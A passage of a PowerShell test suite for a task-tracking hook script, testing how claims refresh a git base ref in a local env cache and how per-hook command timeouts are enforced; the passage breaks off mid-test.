Write-Host "=== Test Group 10: claim TASK_BASE_REF refresh (W1087) ==="

# Mirror of the bash setup_put_repo: a real two-commit git repo with the stride
# state files gitignored, a pre-seeded cache carrying a STALE base ref (the v1
# commit) and a TASK_ID line to prove preservation. The ps1 test suite had no
# git-backed fixtures before this group.
function New-GitRepo {
    param([string]$Name)
    $dir = Join-Path $TmpDir $Name
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    & git -C $dir init -q 2>$null | Out-Null
    & git -C $dir config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $dir config user.name 'Test' 2>$null | Out-Null
    & git -C $dir config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $dir '.gitignore') `
        -Value ".stride.md`n.stride-env-cache`n.stride-changed-files.json`n.stride-diff-upload-state" -Encoding UTF8
    Set-Content -Path (Join-Path $dir 'tracked.txt') -Value 'v1' -Encoding UTF8
    & git -C $dir add .gitignore tracked.txt 2>$null | Out-Null
    & git -C $dir commit -q -m 'v1' 2>$null | Out-Null
    Set-Content -Path (Join-Path $dir 'tracked.txt') -Value 'v2' -Encoding UTF8
    & git -C $dir add tracked.txt 2>$null | Out-Null
    & git -C $dir commit -q -m 'v2' 2>$null | Out-Null
    $putBase = (& git -C $dir rev-parse 'HEAD~1' | Out-String).Trim()
    Set-Content -Path (Join-Path $dir '.stride-env-cache') -Value "TASK_ID=42`nTASK_BASE_REF=$putBase" -Encoding UTF8
    Set-Content -Path (Join-Path $dir '.stride.md') -Value @'
## before_doing
```bash
echo "claimed"
```
'@ -Encoding UTF8
    return $dir
}

if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: git not available — Group 10 requires it" -ForegroundColor Yellow
} else {
    # 10a: inline stdout JSON (Claude Code wrapper) writes the full cache with
    # TASK_BASE_REF equal to current HEAD.
    $brA = New-GitRepo -Name 'g10-inline'
    $headA = (& git -C $brA rev-parse HEAD | Out-String).Trim()
    $claimA = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = '{"data":{"id":42,"identifier":"W42","title":"Inline Task","status":"in_progress","complexity":"medium","priority":"high"}}'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimA -Phase 'post' -ProjectDir $brA
    Assert-Exit "10a: inline JSON claim exits 0" 0 $r.ExitCode
    $cacheA = Get-Content -Raw -Path (Join-Path $brA '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10a: inline JSON writes the identifier" "TASK_IDENTIFIER='W42'" $cacheA
    Assert-Contains "10a: inline JSON sets TASK_BASE_REF to current HEAD" "TASK_BASE_REF='$headA'" $cacheA

    # 10b: a persisted-output notice pointing at a readable file containing the
    # API JSON writes the full cache from the file content.
    $brB = New-GitRepo -Name 'g10-persisted'
    $headB = (& git -C $brB rev-parse HEAD | Out-String).Trim()
    $persistDirB = Join-Path $TmpDir 'g10-persist-b'
    New-Item -ItemType Directory -Path $persistDirB -Force | Out-Null
    $persistFileB = Join-Path $persistDirB 'persisted.json'
    Set-Content -Path $persistFileB -Value '{"data":{"id":77,"identifier":"W77","title":"Persisted Task","status":"in_progress","complexity":"medium","priority":"high"}}' -Encoding UTF8 -NoNewline
    $claimB = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = "Full output saved to: $persistFileB"; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimB -Phase 'post' -ProjectDir $brB
    Assert-Exit "10b: persisted-file claim exits 0" 0 $r.ExitCode
    $cacheB = Get-Content -Raw -Path (Join-Path $brB '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10b: persisted file supplies the identifier" "TASK_IDENTIFIER='W77'" $cacheB
    Assert-Contains "10b: persisted file path sets TASK_BASE_REF to HEAD" "TASK_BASE_REF='$headB'" $cacheB

    # 10c: garbage stdout with no persisted file refreshes only TASK_BASE_REF,
    # preserves the prior TASK_ID line, and removes the stale snapshot.
    $brC = New-GitRepo -Name 'g10-garbage'
    $headC = (& git -C $brC rev-parse HEAD | Out-String).Trim()
    Set-Content -Path (Join-Path $brC '.stride-changed-files.json') -Value '[{"path":"stale.txt","diff":"x"}]' -Encoding UTF8
    $claimC = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = 'this is not json at all'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimC -Phase 'post' -ProjectDir $brC
    Assert-Exit "10c: garbage-stdout claim exits 0" 0 $r.ExitCode
    $cacheC = Get-Content -Raw -Path (Join-Path $brC '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10c: garbage stdout preserves the prior TASK_ID" "TASK_ID=42" $cacheC
    Assert-Contains "10c: garbage stdout still refreshes TASK_BASE_REF to HEAD" "TASK_BASE_REF='$headC'" $cacheC
    if (-not (Test-Path (Join-Path $brC '.stride-changed-files.json'))) {
        Write-Host "  PASS: 10c: base-ref-only refresh removes the stale snapshot" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: 10c: stale snapshot survived the base-ref-only refresh" -ForegroundColor Red
        $script:FAIL++
    }

    # 10d: a persisted-output notice pointing at a MISSING file falls through to
    # the base-ref-only refresh (prior TASK_ID preserved, TASK_BASE_REF = HEAD).
    $brD = New-GitRepo -Name 'g10-missing-file'
    $headD = (& git -C $brD rev-parse HEAD | Out-String).Trim()
    $claimD = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = "Full output saved to: $TmpDir/g10-does-not-exist.json"; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimD -Phase 'post' -ProjectDir $brD
    Assert-Exit "10d: missing-persisted-file claim exits 0" 0 $r.ExitCode
    $cacheD = Get-Content -Raw -Path (Join-Path $brD '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10d: missing persisted file preserves the prior TASK_ID" "TASK_ID=42" $cacheD
    Assert-Contains "10d: missing persisted file refreshes TASK_BASE_REF to HEAD" "TASK_BASE_REF='$headD'" $cacheD

    # 10e: a non-claim post invocation (complete URL) leaves TASK_BASE_REF
    # untouched at the previously-recorded base ref.
    $brE = New-GitRepo -Name 'g10-noclaim'
    $putBaseE = (& git -C $brE rev-parse 'HEAD~1' | Out-String).Trim()
    $claimE = @{ tool_input = @{ command = 'curl -X PATCH http://127.0.0.1:1/api/tasks/42/complete' } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimE -Phase 'post' -ProjectDir $brE
    Assert-Exit "10e: complete URL exits 0" 0 $r.ExitCode
    $cacheE = Get-Content -Raw -Path (Join-Path $brE '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10e: complete URL leaves TASK_BASE_REF at the prior base ref" "TASK_BASE_REF=$putBaseE" $cacheE

    # 10f: garbage stdout in a NON-git directory (rev-parse fails) never crashes
    # the hook and writes no cache.
    $brF = Join-Path $TmpDir 'g10-nongit'
    New-Item -ItemType Directory -Path $brF -Force | Out-Null
    Set-Content -Path (Join-Path $brF '.stride.md') -Value @'
## before_doing
```bash
echo "claimed"
```
'@ -Encoding UTF8
    $claimF = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = 'not json'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimF -Phase 'post' -ProjectDir $brF
    Assert-Exit "10f: garbage stdout in a non-git dir exits 0" 0 $r.ExitCode
    if (-not (Test-Path (Join-Path $brF '.stride-env-cache'))) {
        Write-Host "  PASS: 10f: no cache written when HEAD is unresolvable" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: 10f: cache written despite unresolvable HEAD" -ForegroundColor Red
        $script:FAIL++
    }

    # 10g: a persisted file whose content is harness preview text (not JSON)
    # falls through to the base-ref-only refresh.
    $brG = New-GitRepo -Name 'g10-nonjson-file'
    $headG = (& git -C $brG rev-parse HEAD | Out-String).Trim()
    $persistDirG = Join-Path $TmpDir 'g10-persist-g'
    New-Item -ItemType Directory -Path $persistDirG -Force | Out-Null
    $persistFileG = Join-Path $persistDirG 'preview.txt'
    Set-Content -Path $persistFileG -Value "... (output truncated for preview) ...`nnot valid json" -Encoding UTF8
    $claimG = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = "Full output saved to: $persistFileG"; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimG -Phase 'post' -ProjectDir $brG
    Assert-Exit "10g: non-JSON-persisted-file claim exits 0" 0 $r.ExitCode
    $cacheG = Get-Content -Raw -Path (Join-Path $brG '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10g: non-JSON persisted file preserves the prior TASK_ID" "TASK_ID=42" $cacheG
    Assert-Contains "10g: non-JSON persisted file refreshes TASK_BASE_REF to HEAD" "TASK_BASE_REF='$headG'" $cacheG

    # 10h: garbage stdout with NO pre-existing cache creates one containing only
    # TASK_BASE_REF (no TASK_ identity lines to preserve).
    $brH = New-GitRepo -Name 'g10-absent-cache'
    Remove-Item -Force (Join-Path $brH '.stride-env-cache') -ErrorAction SilentlyContinue
    $headH = (& git -C $brH rev-parse HEAD | Out-String).Trim()
    $claimH = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = 'garbage'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimH -Phase 'post' -ProjectDir $brH
    Assert-Exit "10h: absent-cache claim exits 0" 0 $r.ExitCode
    $cacheH = Get-Content -Raw -Path (Join-Path $brH '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10h: absent cache is created with TASK_BASE_REF at HEAD" "TASK_BASE_REF='$headH'" $cacheH
    Assert-NotContains "10h: no spurious TASK_ID line created" "TASK_ID=" $cacheH

    # 10i: a persisted-output path containing spaces is recovered intact. Guards
    # the bash/ps1 parity contract (W1086 test 14i).
    $brI = New-GitRepo -Name 'g10-spaced-path'
    $persistDirI = Join-Path $TmpDir 'g10 persist with space'
    New-Item -ItemType Directory -Path $persistDirI -Force | Out-Null
    $persistFileI = Join-Path $persistDirI 'persisted.json'
    Set-Content -Path $persistFileI -Value '{"data":{"id":88,"identifier":"W88","title":"Spaced Task","status":"in_progress","complexity":"small","priority":"low"}}' -Encoding UTF8 -NoNewline
    $claimI = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = "Full output saved to: $persistFileI"; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimI -Phase 'post' -ProjectDir $brI
    Assert-Exit "10i: spaced-path claim exits 0" 0 $r.ExitCode
    $cacheI = Get-Content -Raw -Path (Join-Path $brI '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10i: persisted path with spaces is recovered" "TASK_IDENTIFIER='W88'" $cacheI

    # 10j: an id-only persisted payload (no {"data":...} envelope) caches its
    # identity lines instead of throwing under StrictMode and falling through —
    # parity with the bash reference, whose two independent probes handle it.
    $brJ = New-GitRepo -Name 'g10-id-only'
    $headJ = (& git -C $brJ rev-parse HEAD | Out-String).Trim()
    $persistDirJ = Join-Path $TmpDir 'g10-persist-j'
    New-Item -ItemType Directory -Path $persistDirJ -Force | Out-Null
    $persistFileJ = Join-Path $persistDirJ 'persisted.json'
    Set-Content -Path $persistFileJ -Value '{"id":99,"identifier":"W99","title":"Id Only","status":"in_progress","complexity":"small","priority":"low"}' -Encoding UTF8 -NoNewline
    $claimJ = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = "Full output saved to: $persistFileJ"; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimJ -Phase 'post' -ProjectDir $brJ
    Assert-Exit "10j: id-only persisted payload claim exits 0" 0 $r.ExitCode
    $cacheJ = Get-Content -Raw -Path (Join-Path $brJ '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "10j: id-only persisted payload caches the identifier" "TASK_IDENTIFIER='W99'" $cacheJ
    Assert-Contains "10j: id-only persisted payload sets TASK_BASE_REF to HEAD" "TASK_BASE_REF='$headJ'" $cacheJ

    # 10k (D259): mirrors bash 14o. This branch was a three-key deny-list while
    # its own comment claimed to keep "TASK_ identity lines", so GOAL_*,
    # BOARD_*, COLUMN_* and AGENT_NAME crossed the claim boundary and a fresh
    # window opened carrying the previous goal's identity. It also never
    # stripped TASK_BASE_REF_UNPROVEN, which the bash side has stripped since
    # D226 — a divergence the deny-list shape hid.
    #
    # (W2102) The seeded records are QUOTED, which is the shape every writer in
    # this version emits. It matters here because W2102's retention re-emit
    # reads partners through Read-TaskRecord's strict ^KEY='[^']*'\z check
    # rather than copying their lines: a legacy BARE partner record is not a
    # record to that reader and is dropped. That degrades toward absence and
    # self-heals on the next window - the same fail-closed trade D280's shape
    # gate makes - but a bare fixture would be testing a pre-D280 cache shape
    # rather than this one.
    #
    # The seeded cache carries one record from each of the five per-task
    # families, all of which must survive: stripping TASK_BASE_AT_ or
    # TASK_NARROWED_ would reopen the defects D273 closed on the bash side, and
    # the two ports must not disagree about what a claim window preserves.
    $brK = New-GitRepo -Name 'g10-d259-hygiene'
    Set-Content -Path (Join-Path $brK '.stride-env-cache') -Value @"
TASK_ID=41
TASK_IDENTIFIER=W41
GOAL_ID=6
GOAL_TITLE=Alpha Goal
BOARD_ID=3
BOARD_NAME=Old Board
COLUMN_NAME=Doing
AGENT_NAME=Someone Else
TASK_BASE_REF=deadbeef
TASK_BASE_REF_TRUSTED=1
TASK_BASE_REF_OWNER=41
TASK_BASE_REF_UNPROVEN=1
TASK_BASE_REF_77='aaaa111'
TASK_HEAD_REF_77='bbbb222'
TASK_OWNED_77='cccc333'
TASK_BASE_AT_77='1786846260'
TASK_NARROWED_77='yes'
"@ -Encoding UTF8
    $claimK = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = 'Internal Server Error'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $claimK -Phase 'post' -ProjectDir $brK
    Assert-Exit "10k (D259): unparseable claim over a polluted cache exits 0" 0 $r.ExitCode
    $cacheK = @(Get-Content -Path (Join-Path $brK '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    foreach ($k in @('GOAL_ID', 'GOAL_TITLE', 'BOARD_ID', 'BOARD_NAME', 'COLUMN_NAME', 'AGENT_NAME')) {
        Assert-Eq "10k (D259): no stale $k survives an unparseable claim" "0" `
            "$(@($cacheK | Where-Object { $_ -match "^$k=" }).Count)"
    }
    Assert-Contains "10k (D259): TASK_ID still recoverable, the branch's stated purpose" `
        "TASK_ID=41" "$($cacheK -join "`n")"
    foreach ($k in @('TASK_BASE_REF_77', 'TASK_HEAD_REF_77', 'TASK_OWNED_77', 'TASK_BASE_AT_77', 'TASK_NARROWED_77')) {
        Assert-Eq "10k (D259): the $k attribution record survives the clear" "1" `
            "$(@($cacheK | Where-Object { $_ -match "^$k=" }).Count)"
    }
    # The shared base keys: assert on the stale VALUE, not on a line count.
    # Unlike the bash twin, this port refreshes TASK_BASE_REF (and its trust
    # marker) to current HEAD later in the SAME call — 10c pins that — so those
    # keys are legitimately present afterwards, belonging to the NEW window. A
    # zero-count assertion would therefore fail for the right behaviour. What
    # must not survive is the PREVIOUS window's base, which is observable by
    # value, and the owner stamp that would let a stripped cache still claim it.
    Assert-Eq "10k (D259): the previous window's base value does not survive" "0" `
        "$(@($cacheK | Where-Object { $_ -match 'deadbeef' }).Count)"
    Assert-Eq "10k (D259): TASK_BASE_REF_OWNER is stripped" "0" `
        "$(@($cacheK | Where-Object { $_ -match '^TASK_BASE_REF_OWNER=' }).Count)"

    # 10l (D260): mirrors bash 14q. One parseable claim wrote every identity key
    # twice — the rewrite from the data block, then Set-HookEnv's write from
    # the env block — so a first-match reader and a sourcing reader disagreed
    # under a data-vs-env skew. The forwarded env block wins, because that is
    # already what the export puts in the section's process env; only the cache
    # stops contradicting itself.
    $brL = New-GitRepo -Name 'g10-d260-skew'
    # New-GitRepo's before_doing just echoes "claimed"; this case needs a
    # section that prints the values under test, so the pitfall assertion below
    # can read what the section actually received rather than inferring it.
    Set-Content -Path (Join-Path $brL '.stride.md') -Value @'
## before_doing
```bash
echo "s=[$TASK_STATUS] t=[$TASK_TITLE]"
```

## before_review
```bash
true
```
'@ -Encoding UTF8
    $claimL = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = (@{
            data = @{ id = 42; identifier = 'W42'; title = 'Task title in data'; status = 'doing'; complexity = 'small'; priority = 'high' }
            hook = @{ name = 'before_doing'; env = @{ TASK_STATUS = 'ready'; TASK_TITLE = 'Task title in env (stale)'; TASK_DESCRIPTION = 'only in env' } }
        } | ConvertTo-Json -Depth 8 -Compress); stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Depth 8 -Compress
    $r = Invoke-HookScript -InputJson $claimL -Phase 'post' -ProjectDir $brL
    Assert-Exit "10l (D260): skewed parseable claim exits 0" 0 $r.ExitCode
    $cacheL = @(Get-Content -Path (Join-Path $brL '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    foreach ($k in @('TASK_ID', 'TASK_IDENTIFIER', 'TASK_TITLE', 'TASK_STATUS', 'TASK_COMPLEXITY', 'TASK_PRIORITY')) {
        Assert-Eq "10l (D260): exactly one $k line after one parseable claim" "1" `
            "$(@($cacheL | Where-Object { $_ -match "^$k=" }).Count)"
    }
    Assert-Eq "10l (D260): the surviving value is the forwarded env block's" "TASK_TITLE='Task title in env (stale)'" `
        "$(@($cacheL | Where-Object { $_ -match '^TASK_TITLE=' }) | Select-Object -First 1)"
    Assert-Eq "10l (D260): a key only the env supplies is still forwarded, exactly once" "1" `
        "$(@($cacheL | Where-Object { $_ -match '^TASK_DESCRIPTION=' }).Count)"
    Assert-Eq "10l (D260): the per-task base record is untouched" "1" `
        "$(@($cacheL | Where-Object { $_ -match '^TASK_BASE_REF_42=' }).Count)"
    # The pitfall, pinned on this port too: only the cache line count may
    # change, never the value the section receives in its process env.
    Assert-Contains "10l (D260): the section still receives the forwarded env values, unchanged" `
        "s=[ready] t=[Task title in env (stale)]" $r.Stdout
    # And the accumulation the sh side measured at 2 -> 3 -> 4: a later post
    # hook in the same window must not add another copy.
    $completeL = @{
        tool_input = @{ command = 'curl -X PATCH https://stride.example.com/api/tasks/42/complete' }
        tool_response = @{ stdout = (@{
            data = @{ id = 42 }
            hooks = @(@{ name = 'before_review'; env = @{ TASK_ID = '42'; TASK_TITLE = 'Task title in env (stale)' } })
        } | ConvertTo-Json -Depth 8 -Compress); stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Depth 8 -Compress
    $null = Invoke-HookScript -InputJson $completeL -Phase 'post' -ProjectDir $brL
    $null = Invoke-HookScript -InputJson $completeL -Phase 'post' -ProjectDir $brL
    $cacheL2 = @(Get-Content -Path (Join-Path $brL '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "10l (D260): later post hooks in the same window do not accumulate copies" "1" `
        "$(@($cacheL2 | Where-Object { $_ -match '^TASK_TITLE=' }).Count)"

    # 10m (D260): mirrors bash 14r — testing_strategy edge case (b). An env
    # block supplying NO TASK_* keys must leave the rewrite-only path exactly
    # as it was. This needs its own ps1 case rather than inheriting the sh one,
    # because the guard against a blanket sweep is a DIFFERENT mechanism here:
    # Set-HookEnv keys its filter on $EnvMap.Keys, where the bash twin uses a
    # quote-aware scan of the lines it was handed.
    $brM = New-GitRepo -Name 'g10-d260-noTaskEnv'
    $claimM = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = (@{
            data = @{ id = 43; identifier = 'W43'; title = 'Only in data'; status = 'doing'; complexity = 'small'; priority = 'low' }
            hook = @{ name = 'before_doing'; env = @{ BOARD_NAME = 'Stride Development'; AGENT_NAME = 'Someone' } }
        } | ConvertTo-Json -Depth 8 -Compress); stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Depth 8 -Compress
    $null = Invoke-HookScript -InputJson $claimM -Phase 'post' -ProjectDir $brM
    $cacheM = @(Get-Content -Path (Join-Path $brM '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "10m (D260): rewrite-only path still writes exactly one TASK_TITLE line" "1" `
        "$(@($cacheM | Where-Object { $_ -match '^TASK_TITLE=' }).Count)"
    Assert-Eq "10m (D260): and it keeps the data block's value when the env supplies none" "TASK_TITLE='Only in data'" `
        "$(@($cacheM | Where-Object { $_ -match '^TASK_TITLE=' }) | Select-Object -First 1)"
    Assert-Contains "10m (D260): a non-TASK key the env did supply still lands" `
        "BOARD_NAME='Stride Development'" "$($cacheM -join "`n")"

    # 10n (D269): a non-integer task id must name no per-task record. The
    # -replace sanitizer is not injective -- '42-x' and '42.x' both become
    # '42_x' -- so two logically distinct tasks would share TASK_BASE_REF_42_x
    # and one completion could consume the other's base. A task id is an
    # integer (documented in docs/api/get_tasks.md, enforced by the schema's
    # default Ecto integer primary key), so the guard refuses non-integers at
    # the source rather than re-encoding around them.
    #
    # (W2101) All five families now have a key builder on this port, so the
    # guard is asserted across all five -- as the bash twin does at
    # test-stride-hook.sh:8052-8068 -- rather than on TASK_BASE_REF alone.
    # The claim path still WRITES only TASK_BASE_REF_<id>: the other four have a
    # record layer (Group 22) but no orchestration calling it yet, so what is
    # asserted here is that no colliding record exists under ANY family, not
    # that the claim was expected to write one.
    $brN = New-GitRepo -Name 'g10-d269-nonint'
    $claimN = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = (@{
            data = @{ id = '42-x'; identifier = 'W42'; title = 't'; status = 'in_progress'; complexity = 'small'; priority = 'high' }
        } | ConvertTo-Json -Depth 8 -Compress); stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Depth 8 -Compress
    $r = Invoke-HookScript -InputJson $claimN -Phase 'post' -ProjectDir $brN
    Assert-Exit "10n (D269): a non-integer claim id exits 0" 0 $r.ExitCode
    $cacheN = @(Get-Content -Path (Join-Path $brN '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "10n (D269): no per-task record is written under a sanitized non-integer id" "0" `
        "$(@($cacheN | Where-Object { $_ -match '^TASK_BASE_REF_42_x=' }).Count)"
    # (W2101) Across ALL FIVE families, matching the bash twin's loop. The
    # collision the sanitizer could create is namespace-wide, so asserting on
    # one family would leave four unguarded the moment they gain a writer.
    $g10nAll = 0
    foreach ($fam in @('TASK_BASE_REF_42_x', 'TASK_HEAD_REF_42_x', 'TASK_OWNED_42_x',
                       'TASK_BASE_AT_42_x', 'TASK_NARROWED_42_x')) {
        $g10nAll += @($cacheN | Where-Object { $_ -match ('^' + [regex]::Escape($fam) + '=') }).Count
    }
    Assert-Eq "10n (W2101): and none is written under ANY of the five families" "0" "$g10nAll"
    # The control: an integer id still gets its record, so the guard costs the
    # real population nothing.
    $brN2 = New-GitRepo -Name 'g10-d269-int'
    $claimN2 = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = (@{
            data = @{ id = 42; identifier = 'W42'; title = 't'; status = 'in_progress'; complexity = 'small'; priority = 'high' }
        } | ConvertTo-Json -Depth 8 -Compress); stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Depth 8 -Compress
    $null = Invoke-HookScript -InputJson $claimN2 -Phase 'post' -ProjectDir $brN2
    $cacheN2 = @(Get-Content -Path (Join-Path $brN2 '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "10n (D269): an integer id still writes its per-task record" "1" `
        "$(@($cacheN2 | Where-Object { $_ -match '^TASK_BASE_REF_42=' }).Count)"

    # 10o (D269) — NOT WRITTEN, and the reason is recorded rather than left
    # as a silent gap. The read-side guard in Invoke-ChangedFilesUpload
    # (stride-hook.ps1) refuses to look up TASK_BASE_REF_<id> for a non-integer
    # id, so a colliding id cannot pick up another task's base. I built a
    # listener-based case for it and it passed against the PRE-fix script too,
    # i.e. it proved nothing, so it was removed rather than shipped green: the
    # committed-range effect of that lookup is not observable through the PUT
    # body on this port, and finding an observable surface needed more digging
    # than a minor warrants. The guard is defence-in-depth — post-D269 the
    # write side means no such record is created, so it only matters for
    # records left by older versions — and the bash twin's equivalent IS
    # covered by 23z15/23z15c.
    #
    # BE PRECISE ABOUT THE OBSTACLE, because the first version of this note was
    # not: it said the effect "is not observable through the PUT body on this
    # port", which is wrong and would tell a future porter the surface does not
    # exist. It does — $committedRange is consumed as the D142 override that
    # RETAINS an otherwise baseline-excluded path, and test 7d already decodes
    # and asserts the filtered list from a captured PUT body. The real gap is
    # narrower and fixable: no ps1 fixture has ever built a
    # .stride-dirty-baseline, which is what makes the override's effect visible.
    # Build one and this guard is pinnable with the existing listener idiom.
}

# ============================================================
# Test Group 11: per-hook command timeouts (W1454)
# ============================================================
Write-Host ""
Write-Host "=== Test Group 11: per-hook command timeouts (W1454) ==="

$claimJson11 = '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}'

# 11a: A command exceeding the budget is killed (tree kill) and reported as a
# blocking failure naming the hook and budget.
$toProj = Join-Path $TmpDir 'g11-timeout-project'
New-Item -ItemType Directory -Path $toProj -Force | Out-Null
Set-Content -Path (Join-Path $toProj '.stride.md') -Value @'
## before_doing
```bash
echo "started"
sleep 30
touch should_not_exist.txt
```
'@ -Encoding UTF8
$env:STRIDE_HOOK_TIMEOUT_OVERRIDE = "$($script:TimeoutTestBudget)"
try {
    $toStart = [DateTimeOffset]::UtcNow
    $r = Invoke-HookScript -InputJson $claimJson11 -Phase 'post' -ProjectDir $toProj
    $toWall = ([DateTimeOffset]::UtcNow - $toStart).TotalSeconds
} finally {
    Remove-Item Env:STRIDE_HOOK_TIMEOUT_OVERRIDE -ErrorAction SilentlyContinue
}
Assert-Exit "11a: timed-out hook exits 2 (blocking failure)" 2 $r.ExitCode
Assert-Contains "11a: stderr names the hook and budget" "Stride before_doing hook command 2/3 timed out after $($script:TimeoutTestBudget)s budget" $r.Stderr
Assert-Contains "11a: failure JSON marks timed_out" '"timed_out":true' $r.Stdout
Assert-Contains "11a: failure JSON carries exit 124" '"exit_code":124' $r.Stdout
Assert-Contains "11a: failure JSON carries the budget" "`"budget_seconds`":$($script:TimeoutTestBudget)" $r.Stdout
if (Test-Path (Join-Path $toProj 'should_not_exist.txt')) {
    Write-Host "  FAIL: 11a: commands after the timeout must not run" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 11a: commands after the timeout do not run" -ForegroundColor Green
    $script:PASS++
}
if ($toWall -lt (Get-WallBudget -Base 20 -UnkilledSec 30)) {
    Write-Host "  PASS: 11a: killed promptly ($([int]$toWall)s wall clock)" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 11a: expected prompt kill, took $([int]$toWall)s" -ForegroundColor Red
    $script:FAIL++
}

# 11b: Commands within the budget are unaffected.
$wbProj = Join-Path $TmpDir 'g11-within-budget'
New-Item -ItemType Directory -Path $wbProj -Force | Out-Null
Set-Content -Path (Join-Path $wbProj '.stride.md') -Value @'
## before_doing
```bash
echo "fast one"
echo "fast two"
```
'@ -Encoding UTF8
$env:STRIDE_HOOK_TIMEOUT_OVERRIDE = '30'
try {
    $r = Invoke-HookScript -InputJson $claimJson11 -Phase 'post' -ProjectDir $wbProj
} finally {
    Remove-Item Env:STRIDE_HOOK_TIMEOUT_OVERRIDE -ErrorAction SilentlyContinue
}
Assert-Exit "11b: within-budget hook exits 0" 0 $r.ExitCode
Assert-Contains "11b: success JSON emitted" '"status":"success"' $r.Stdout
Assert-Contains "11b: both commands completed" 'fast two' $r.Stdout

# 11c: Server-supplied timeout (ms) takes precedence over the documented
# default — enforced end-to-end with no env override set.
$srvProj = Join-Path $TmpDir 'g11-server-timeout'
New-Item -ItemType Directory -Path $srvProj -Force | Out-Null
Set-Content -Path (Join-Path $srvProj '.stride.md') -Value @'
## before_review
```bash
sleep 30
```
'@ -Encoding UTF8
$srvInner = '{"data":{"id":99},"hooks":[{"name":"before_review","timeout":1000}]}'
$srvJson = @{
    tool_input = @{ command = 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' }
    tool_response = @{ stdout = $srvInner; stderr = ''; interrupted = $false }
} | ConvertTo-Json -Compress
$srvStart = [DateTimeOffset]::UtcNow
$r = Invoke-HookScript -InputJson $srvJson -Phase 'post' -ProjectDir $srvProj
$srvWall = ([DateTimeOffset]::UtcNow - $srvStart).TotalSeconds
Assert-Exit "11c: server 1000ms timeout enforced end-to-end (exit 2)" 2 $r.ExitCode
Assert-Contains "11c: stderr names the server-derived 1s budget" "timed out after 1s budget" $r.Stderr
if ($srvWall -lt (Get-WallBudget -Base 20 -UnkilledSec 30)) {
    Write-Host "  PASS: 11c: killed on the server budget ($([int]$srvWall)s wall clock)" -ForegroundColor Green
    $script:PASS++
} else {
